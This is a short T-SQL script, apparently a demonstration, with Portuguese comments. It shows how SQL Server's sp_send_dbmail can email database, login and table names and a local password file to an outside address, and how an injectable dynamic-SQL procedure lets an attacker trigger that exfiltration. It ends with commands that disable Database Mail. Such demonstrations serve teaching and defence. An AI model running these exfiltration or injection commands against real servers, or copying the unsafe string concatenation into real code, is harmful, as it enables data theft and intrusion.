

-- Envia informações sigilosas para o invasor
EXEC msdb.dbo.sp_send_dbmail
    @recipients = 'teste@gmail.com', -- varchar(max)
    @subject = N'Teste', -- nvarchar(255)
    @query = N'SELECT name FROM sys.databases; select name from sys.server_principals;select name from sys.tables;',
	@query_result_header = 1,
	@query_result_width = 255,
	@query_result_separator = '|',
	@attach_query_result_as_file = 0
    

-- Envia arquivos locais do servidor
EXEC msdb.dbo.sp_send_dbmail
    @recipients = 'teste@gmail.com', -- varchar(max)
    @subject = N'Teste anexo', -- nvarchar(255)
	@body = 'Teste',
	@body_format = 'HTML',
    @file_attachments = 'C:\Senha muito importante.txt'













-- Utiliza um SQL Injection para enviar informações sigilosas
CREATE OR ALTER PROCEDURE dbo.stpConsulta_Tabela (
	@Nome VARCHAR(MAX)
)
AS
BEGIN

	DECLARE @Comando VARCHAR(MAX) = 'SELECT * FROM sys.tables WHERE [name] = ''' + @Nome + ''''
	EXEC(@Comando)

END

EXEC dbo.stpConsulta_Tabela 'Teste'

EXEC dbo.stpConsulta_Tabela 'Teste'' OR 1=1;EXEC msdb.dbo.sp_send_dbmail
    @recipients = ''teste@gmail.com'',
    @subject = N''Teste'',
    @query = N''SELECT name FROM sys.databases; select name from sys.server_principals;select name from sys.tables;'',
	@query_result_header = 1,
	@query_result_width = 255,
	@query_result_separator = ''|'',
	@attach_query_result_as_file = 0 --'














-- Desabilita o envio de e-mail no servidor
sp_configure 'show advanced options', 1;
GO

RECONFIGURE
GO

sp_configure 'Database Mail XPs', 0;
GO

sp_configure 'SQL Mail XPs', 0;
GO

RECONFIGURE
GO